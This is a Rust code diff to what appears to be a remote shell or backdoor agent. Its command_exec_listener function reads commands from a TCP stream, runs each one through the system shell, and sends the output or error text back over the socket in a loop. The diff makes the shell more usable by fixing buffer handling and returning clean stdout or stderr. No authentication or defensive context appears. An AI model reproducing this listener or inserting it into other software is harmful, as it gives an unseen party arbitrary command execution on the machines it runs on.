@@ -53,31 +53,40 @@ fn get_os_fam() -> Vec<String> {
 
 fn command_exec_listener(stream: &mut TcpStream) -> ! {
     let cmd = get_os_fam();
-    let mut buf = String::new();
 
     loop {
-        let size = stream.read_to_string(&mut buf);
-        println!("Read {:?}", buf);
+        let mut buf: [u8; 512] = [0; 512];
+        let size = stream.read(&mut buf);
+
         match size {
             Err(e) => match write!(stream, "Failure to read from stream with error {e}") {
                 Ok(_) => println!("Successfully wrote to stream"),
                 Err(e) => println!("Failed to write to stream with error {e}"),
             },
             Ok(_) => {
-                println!("Executing: {}", buf);
+                let rec_com = String::from_utf8(buf.to_vec()).expect("fount invalid data");
+                let rec_com = rec_com.trim_matches(char::from(0));
+                println!("Read {}", rec_com);
+
                 let resp = Command::new(&cmd[0])
                     .arg(&cmd[1])
-                    .arg(&buf)
+                    .arg(&rec_com)
                     .output()
                     .expect("failed to exec command");
                 println!("result: {resp:?}");
-                match write!(stream, "{:?}", resp) {
+
+                let mut response_str =
+                    String::from_utf8(resp.stdout).expect("Invalid data in string.");
+                if response_str.len() == 0 && resp.stderr.len() > 0 {
+                    response_str = String::from_utf8(resp.stderr).expect("Invalid data in string.");
+                }
+
+                match write!(stream, "{}\n", response_str) {
                     Ok(_) => println!("Successfully returned result for command"),
                     Err(e) => println!("Failed to return result for command with error {e}"),
                 }
             }
         }
         sleep(Duration::new(5, 0));
-        buf.clear();
     }
 }
